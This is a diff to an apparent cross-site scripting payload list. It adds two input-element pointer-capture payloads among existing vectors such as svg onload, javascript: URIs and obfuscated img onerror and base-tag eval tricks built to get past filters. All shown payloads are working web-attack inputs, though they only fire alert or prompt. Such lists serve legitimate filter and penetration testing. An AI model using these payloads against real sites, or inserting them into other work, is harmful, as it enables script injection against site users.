@@ -24,6 +24,8 @@ javascript:var{a:onerror}={a:%2561lert};throw%20origin
 <svg onload=alert(1)>
 <svg%09onload=alert(1)>
 <svg onload=alert(1)>
+<input type=range ongotpointercapture=alert(1)>
+<input type=range onlostpointercapture=alert(2)>
 <base href="alert(1)" onfocus="a = /\/([^/]+)$/.exec(baseURI); eval(a[1]);" tabindex=1 style="display:block" autofocus></base>
 <img%20hrEF="x"%20sRC="data:x,"%20oNLy=1%20oNErrOR=prompt1>
 <img+src=oNlY=1+ onerror="alert(['a', 'x', 'b', 'x', 'c', 's'].map(c => c.replace(/[abc]/g, '')).join(''))">
